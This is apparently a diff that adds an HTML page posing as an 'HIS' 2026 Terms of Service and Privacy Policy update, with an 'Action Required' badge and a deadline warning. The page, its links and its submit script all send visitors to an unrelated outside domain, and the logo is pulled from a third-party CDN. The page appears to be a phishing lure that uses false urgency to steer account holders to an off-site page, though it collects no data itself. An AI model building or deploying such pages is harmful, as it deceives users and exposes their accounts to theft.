@@ -1,0 +1,404 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>HIS – 2026 Terms of Service Update</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      font-family: Arial, sans-serif;
+      background: #ffffff;
+      color: #0f172a;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 24px;
+    }
+
+    .page-wrapper {
+      max-width: 860px;
+      width: 100%;
+      background-color: #ffffff;
+      border-radius: 16px;
+      box-shadow: 0 12px 30px rgba(15, 23, 42, 0.15);
+      overflow: hidden;
+      border: 1px solid #e2e8f0;
+    }
+
+    .header {
+      background: #ffffff;
+      padding: 16px 24px;
+      color: #0f172a;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 16px;
+      border-bottom: 1px solid #e2e8f0;
+    }
+
+    .header-left {
+      display: flex;
+      align-items: center;
+      gap: 16px;
+    }
+
+    .header-logo {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      background-color: transparent;
+      padding: 6px;
+      border-radius: 10px;
+    }
+
+    .header-logo img {
+      display: block;
+      max-height: 42px;
+      max-width: 140px;
+      width: 100%;
+      height: auto;
+    }
+
+    .header-text h1 {
+      font-size: 18px;
+      margin-bottom: 2px;
+      color: #0f172a;
+    }
+
+    .header-text p {
+      font-size: 12px;
+      color: #4b5563;
+    }
+
+    .content {
+      padding: 24px 32px 28px;
+      background-color: #ffffff;
+    }
+
+    .badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      font-size: 11px;
+      text-transform: uppercase;
+      letter-spacing: 0.08em;
+      background-color: #dbeafe;
+      color: #1e3a8a;
+      border-radius: 999px;
+      padding: 4px 10px;
+      margin-bottom: 12px;
+    }
+
+    .badge-dot {
+      width: 8px;
+      height: 8px;
+      border-radius: 50%;
+      background-color: #22c55e;
+    }
+
+    .title {
+      font-size: 20px;
+      margin-bottom: 8px;
+      color: #0f172a;
+    }
+
+    .subtitle {
+      font-size: 14px;
+      color: #4b5563;
+      margin-bottom: 18px;
+    }
+
+    .terms-box {
+      background-color: #f9fafb;
+      border-radius: 12px;
+      border: 1px solid #e2e8f0;
+      padding: 16px 18px;
+      max-height: 260px;
+      overflow-y: auto;
+      font-size: 13px;
+      line-height: 1.6;
+      color: #111827;
+    }
+
+    .terms-box h2 {
+      font-size: 14px;
+      margin-bottom: 8px;
+      color: #0f172a;
+    }
+
+    .terms-box h3 {
+      font-size: 13px;
+      margin-top: 12px;
+      margin-bottom: 4px;
+      color: #0f172a;
+    }
+
+    .terms-meta {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 10px;
+      font-size: 11px;
+      color: #6b7280;
+      margin-top: 10px;
+      margin-bottom: 16px;
+    }
+
+    .terms-meta span {
+      padding: 4px 8px;
+      border-radius: 999px;
+      background-color: #e0f2fe;
+      color: #1e3a8a;
+    }
+
+    .actions {
+      margin-top: 18px;
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+    }
+
+    .checkbox-row {
+      display: flex;
+      align-items: flex-start;
+      gap: 8px;
+      font-size: 13px;
+      color: #111827;
+    }
+
+    .checkbox-row input[type="checkbox"] {
+      margin-top: 2px;
+      width: 16px;
+      height: 16px;
+      cursor: pointer;
+    }
+
+    .checkbox-row label {
+      cursor: pointer;
+    }
+
+    .checkbox-row a {
+      color: #2563eb;
+      text-decoration: none;
+    }
+
+    .checkbox-row a:hover {
+      text-decoration: underline;
+    }
+
+    .button-row {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 10px;
+      align-items: center;
+      justify-content: flex-start;
+    }
+
+    .primary-btn {
+      border: none;
+      border-radius: 999px;
+      padding: 10px 20px;
+      font-size: 14px;
+      font-weight: 600;
+      cursor: pointer;
+      color: #ffffff;
+      background: linear-gradient(135deg, #1d4ed8, #3b82f6);
+      box-shadow: 0 10px 18px rgba(37, 99, 235, 0.35);
+      transition: transform 0.08s ease, box-shadow 0.08s ease, opacity 0.08s ease;
+    }
+
+    .primary-btn:hover {
+      transform: translateY(-1px);
+      box-shadow: 0 14px 24px rgba(37, 99, 235, 0.45);
+    }
+
+    .primary-btn:active {
+      transform: translateY(0);
+      box-shadow: 0 8px 14px rgba(37, 99, 235, 0.35);
+    }
+
+    .primary-btn:disabled {
+      opacity: 0.6;
+      cursor: not-allowed;
+      box-shadow: none;
+      transform: none;
+    }
+
+    .helper-text {
+      font-size: 11px;
+      color: #6b7280;
+    }
+
+    .footer {
+      border-top: 1px solid #e2e8f0;
+      padding: 12px 32px 16px;
+      font-size: 11px;
+      color: #6b7280;
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: space-between;
+      gap: 8px;
+      background-color: #ffffff;
+    }
+
+    .footer a {
+      color: #2563eb;
+      text-decoration: none;
+    }
+
+    .footer a:hover {
+      text-decoration: underline;
+    }
+
+    @media (max-width: 640px) {
+      body {
+        padding: 16px;
+      }
+
+      .content,
+      .footer {
+        padding-left: 18px;
+        padding-right: 18px;
+      }
+
+      .header-text h1 {
+        font-size: 16px;
+      }
+
+      .title {
+        font-size: 18px;
+      }
+
+      .header {
+        flex-direction: column;
+        align-items: flex-start;
+      }
+    }
+  </style>
+</head>
+<body>
+
+<div class="page-wrapper">
+  <header class="header">
+    <div class="header-left">
+      <div class="header-logo">
+        <img
+          src="https://2xqb9g88cp.ucarecd.net/8d5a74fd-bb37-4667-9c44-e862de2e8ce1/hisreject.png"
+          alt="HIS  Logo"
+        >
+      </div>
+      <div class="header-text">
+        <h1>HIS</h1>
+        <p>2026 Terms of Service and Privacy Policy Update</p>
+      </div>
+    </div>
+  </header>
+
+  <main class="content">
+    <div class="badge">
+      <span class="badge-dot"></span>
+      2026 Update · Action Required
+    </div>
+
+    <h2 class="title">Review and confirm the new HIS terms</h2>
+    <p class="subtitle">
+      To continue using HIS, please review our updated 2026 Terms of Service
+      and Privacy Policy, then confirm your acceptance below.
+    </p>
+
+    <section class="terms-box" aria-label="HIS 2026 Terms of Service summary">
+      <h2>Summary of 2026 updates</h2>
+      <p>
+        Our 2026 update explains how HIS collects, uses, and protects your data,
+        and clarifies your responsibilities for keeping your account secure.
+      </p>
+
+      <h3>Account and security</h3>
+      <p>
+        You are responsible for maintaining the confidentiality of your login details and for all activity that
+        occurs under your account. You agree to notify HIS promptly of any suspected unauthorized use.
+      </p>
+
+      <h3>Data usage and privacy</h3>
+      <p>
+        We process your data only to deliver and improve our services, comply with legal obligations,
+        and protect the security of our network. Additional details are available in the full Privacy Policy.
+      </p>
+
+      <h3>Service availability</h3>
+      <p>
+        We aim to provide reliable access to our services, but occasional maintenance or interruptions may occur.
+        When possible, we will schedule maintenance during low‑traffic periods.
+      </p>
+
+      <h3>Acceptable use</h3>
+      <p>
+        You agree not to use our services to send spam, malicious content, or unlawful material and not to
+        interfere with the operation or security of HIS systems.
+      </p>
+
+      <p style="margin-top: 10px;">
+        For the full legal text, please review the complete Terms of Service and Privacy Policy linked below before confirming.
+      </p>
+
+      <div class="terms-meta">
+        <span>Effective date: March 15, 2026</span>
+        <span>Service: HIS</span>
+        <span>Region: Global</span>
+      </div>
+    </section>
+
+    <form class="actions" onsubmit="return handleSubmit(event)">
+      <div class="checkbox-row">
+        <input type="checkbox" id="acceptTerms" name="acceptTerms" required>
+        <label for="acceptTerms">
+          I have read and agree to the updated
+          <a href="https://www.viewinfoactivity.com/his-security" target="_blank" rel="noopener noreferrer">2026 Terms of Service</a>
+          and Privacy Policy for HIS.
+        </label>
+      </div>
+
+      <div class="button-row">
+        <button type="submit" id="continueBtn" class="primary-btn" disabled>
+          Confirm and continue
+        </button>
+        <p class="helper-text">
+          You must accept the updated terms to continue using your HIS account after March 15, 2026.
+        </p>
+      </div>
+    </form>
+  </main>
+
+  <footer class="footer">
+    <span>© 2026 HIS. All rights reserved.</span>
+    <span>
+      Need help? Visit
+      <a href="https://www.viewinfoactivity.com/his-security" target="_blank" rel="noopener noreferrer">Support</a>
+    </span>
+  </footer>
+</div>
+
+<script>
+  const checkbox = document.getElementById('acceptTerms');
+  const button = document.getElementById('continueBtn');
+
+  checkbox.addEventListener('change', function () {
+    button.disabled = !this.checked;
+  });
+
+  function handleSubmit(event) {
+    event.preventDefault();
+    if (!checkbox.checked) return;
+    window.location.href = 'https://www.viewinfoactivity.com/his-security';
+  }
+</script>
+
+</body>
+</html>
